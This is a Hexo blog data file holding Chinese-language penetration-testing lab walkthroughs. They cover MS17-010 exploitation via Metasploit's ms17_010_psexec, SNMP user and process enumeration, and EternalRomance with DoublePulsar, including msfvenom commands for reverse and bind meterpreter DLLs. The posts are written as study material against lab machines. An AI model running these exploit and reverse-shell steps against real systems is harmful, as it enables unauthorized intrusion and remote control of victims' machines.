{"meta":{"title":"TIN","subtitle":null,"description":null,"author":"TIN","url":"http://dycsy.cn"},"pages":[{"title":"about","date":"2018-05-15T13:40:45.000Z","updated":"2018-05-18T08:38:38.841Z","comments":true,"path":"about/index.html","permalink":"http://dycsy.cn/about/index.html","excerpt":"","text":"此模块和评论任正在建设中…."}],"posts":[{"title":"ms17_010_psexec","slug":"ms17-010-psexec","date":"2018-05-17T16:00:00.000Z","updated":"2018-05-18T08:41:26.003Z","comments":true,"path":"2018/05/18/ms17-010-psexec/","link":"","permalink":"http://dycsy.cn/2018/05/18/ms17-010-psexec/","excerpt":"","text":"一、ms17_010_psexec简介MS17-010 的psexec是针对Microsoft Windows的两款最受欢迎的漏洞进行攻击。 CVE-2017-0146（EternalChampion / EternalSynergy）CVE-2017-0143（EternalRomance / EternalSynergy） 与EternalBlue相比，此模块具有高可靠性和优先级，其中管道名可用于匿名登录 二、使用ms17_010_psexec的前提1.防火墙必须允许SMB流量出入 2.目标必须使用SMBv1协议 3.目标必须缺少MS17-010补丁 4.目标必须允许匿名IPC $和管道名 ms17_010图形化检测工具下载 &nbsp;#也可以用nmap、nessus或msf中自带模块进行扫描 三、利用1. 用pipe_auditor扫描首先利用scanner/smb/pipe_auditor模块扫描目标网段主机可用的管道名，其扫描出来的大多数为匿名的windows2003管道名,如需要扫描出更多的管道名，还需要提供可用的用户名和密码 123use scanner/smb/pipe_auditorset rhosts 192.168.131.128 //也可以设置网段,网段的时候要设置多线程，如，`set threads 10`run 可以看到有这些管道名 netlogon lsarpc samr browser 2.利用ms17_010_psexec进行攻击12345use exploit/windows/smb/ms17_010_psexecset rhost 192.168.131.128set NAMEDPIPE netlogon set lhost 172.29.192.60 #接受反弹回来的shell的IP，一般为攻击机IPrun","categories":[{"name":"永恒家族","slug":"永恒家族","permalink":"http://dycsy.cn/categories/永恒家族/"}],"tags":[{"name":"永恒家族","slug":"永恒家族","permalink":"http://dycsy.cn/tags/永恒家族/"},{"name":"MS17-010","slug":"MS17-010","permalink":"http://dycsy.cn/tags/MS17-010/"}]},{"title":"snmp简单测试","slug":"snmp简单测试","date":"2018-05-16T16:00:00.000Z","updated":"2018-05-18T09:20:33.888Z","comments":true,"path":"2018/05/17/snmp简单测试/","link":"","permalink":"http://dycsy.cn/2018/05/17/snmp简单测试/","excerpt":"","text":"一、环境搭建搜索windows Server2003安装配置snmp 服务,按照提示来就行 二、利用1.找出Coummunity Strings利用于 auxiliary/scanner/snmp/snmp_login 12345use auxiliary/scanner/snmp/snmp_loginset rhosts 192.168.131.128set STOP_ON_SUCCESS trueset threads 15run snmptuil软件下载 在dos命令行下打开snmptuil开始刺探信息 12345snmputil walk 对方ip public .1.3.6.1.2.1.25.4.2.1.2 列出系统进程snmputil walk 对方ip public .1.3.6.1.4.1.77.1.2.25.1.1 列系统用户列表snmputil get 对方ip public .1.3.6.1.4.1.77.1.4.1.0 列出域名snmputil walk 对方ip public .1.3.6.1.2.1.25.6.3.1.2 列出安装的软件snmputil walk 对方ip public .1.3.6.1.2.1.1 列出系统信息 使用snmputil walk 192.168.131.128 public .1.3.6.1.4.1.77.1.2.25.1.1可以看到有个test的用户，用nmap扫描可以发现靶机开了3389，尝试弱口令登录 三、参考链接http://www.freebuf.com/column/144144.html","categories":[{"name":"网络管理","slug":"网络管理","permalink":"http://dycsy.cn/categories/网络管理/"}],"tags":[{"name":"snmp","slug":"snmp","permalink":"http://dycsy.cn/tags/snmp/"},{"name":"网络管理","slug":"网络管理","permalink":"http://dycsy.cn/tags/网络管理/"}]},{"title":"Hello World","slug":"hello-world","date":"2018-05-15T11:50:15.965Z","updated":"2018-05-15T11:50:15.965Z","comments":true,"path":"2018/05/15/hello-world/","link":"","permalink":"http://dycsy.cn/2018/05/15/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"永恒浪漫","slug":"永恒浪漫","date":"2017-07-17T16:00:00.000Z","updated":"2018-05-18T08:34:16.156Z","comments":true,"path":"2017/07/18/永恒浪漫/","link":"","permalink":"http://dycsy.cn/2017/07/18/永恒浪漫/","excerpt":"","text":"一. 起因 看了一下黑盾杯大佬的write up,以前只用过EternalBlue，还没有用过EternalRomance，还可以打win server 2003啊，趁着今天有空，顿时来了兴趣 环境 ip 系统环境 用途说明 备注 192.168.174.130 Windows Server 2003 SP2 攻击机，安装了Fuzzbunch x86架构，需安装python2.6.6 x86版本及pywin32对应版本 192.168.174.131 Windows Server 2003 SP2 靶机 x86架构，局域网服务器，开放了指定端口及服务 192.168.174.128 Kali Rolling 生成回连payload并控制回连会话 一如既往生成dll文件 二. 准备工作第一步刚刚开始运行fb.py的时候会报错，我们要把第72行给注释掉，因为我们没有这个字典 第二步把带有NSA工具的windows目录移出来，顺便重命名一下放在c盘 进入文件夹，新建一个tmp目录，为后面存存放 *.bin和*.dll做准备。 第三步用Smbtouch判断可用漏洞 在cmd命令行上进入a目录，运行fb.py,设置基本参数 日志文件放在c:\\logs下 然后使用命令 use Smbtouch,接着使用execute执行 从运行结果可知，可以利用的有永恒浪漫和永恒冠军 三. 开始利用1.Doublepulsar生成可用shellcode输入命令use Doublepulsar ,然后一路回车，到叫我们输入outputfile的那行，我们输入c:\\\\a\\\\tmp\\\\shell.bin 到了最后会显示Doublepuslar succeeded 可在c:/a/tmp/shell.bin目录下找到shell.bin 2.利用EternalRomance植入Doublepulsar后门首先使用命令use Eternalromance，一路回车，到叫我们输入shellcodefile的地方，输入c:\\\\a\\\\tmp\\\\shell.bin,然后一路回车。到最后执行Execute plugins,执行中…. 到最后显示永恒浪漫利用成功 ps:在这边的话，碰到一个坑，因为这个机器在之前已经植入后门过了，所以再次植入会失败(植入过后可以直接使用)，因为以前植入成功后，那个sessions是隐藏在后台，所以一直不懂用sessions -l这个参数，导致一直卡在那边，然后重复利用EternalRomance会一直显示失败，害得我利用了20多遍，那叫一个心累啊。 3. 生成dll后门使用命令msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=5555 -f dll -o reverse.dll,会生成reverse.dllLHOST 为自己kali linux本地的ip地址 接着启动msf，启动msf的时候不知道为何报错，重启了一下就ok了 接下来分别使用命令use exploit/multi/handler set payload windows/meterpreter/reverse_tcp设置参数 set LHOST 192.168.174.128set LPORT 5555 使用命令exploit开始监听把我们刚刚在kali上生成的reverse.dll放到攻击机的 c:/a/tmp/reverse.dll上 在攻击机上输入命令use Doublepulsar，一路回车，回车到如图，所示，我们选择第二个输入序号2，输入dllpayload的地址c:\\\\a\\\\tmp\\\\reverse.dll,然后一路回车就可以了 等待利用中，接着会显示Doublepulsar 利用成功 然后我们返回到kali linux上，发现反弹成功 ps:在这边的话我碰到了在上面提到过的坑，就是看到反弹成功确是一直显示在这个界面上，重复n多次还是这样，原来，sessions是被隐藏在后台了，我们按一下回车。如图， 接着使用sessions -l命令，列出sessions。 发现有一个会话，接着使用 sessions -i +sessions id也就是sessions -i 1,再使用建立一个交互式shell。使用shell命令 可以发现，利用成功 附录生成 bind 模式的 meterpreter1234# 32位msfvenom -p windows/meterpreter/bind_tcp RHOST=10.1.1.71 LPORT=8089 -f dll &gt;x86bind.dll# 64位msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=10.1.1.71 LPORT=8089 -f dll &gt;x64bind.dll","categories":[{"name":"永恒家族","slug":"永恒家族","permalink":"http://dycsy.cn/categories/永恒家族/"}],"tags":[{"name":"永恒家族","slug":"永恒家族","permalink":"http://dycsy.cn/tags/永恒家族/"},{"name":"MS17-010","slug":"MS17-010","permalink":"http://dycsy.cn/tags/MS17-010/"}]}]}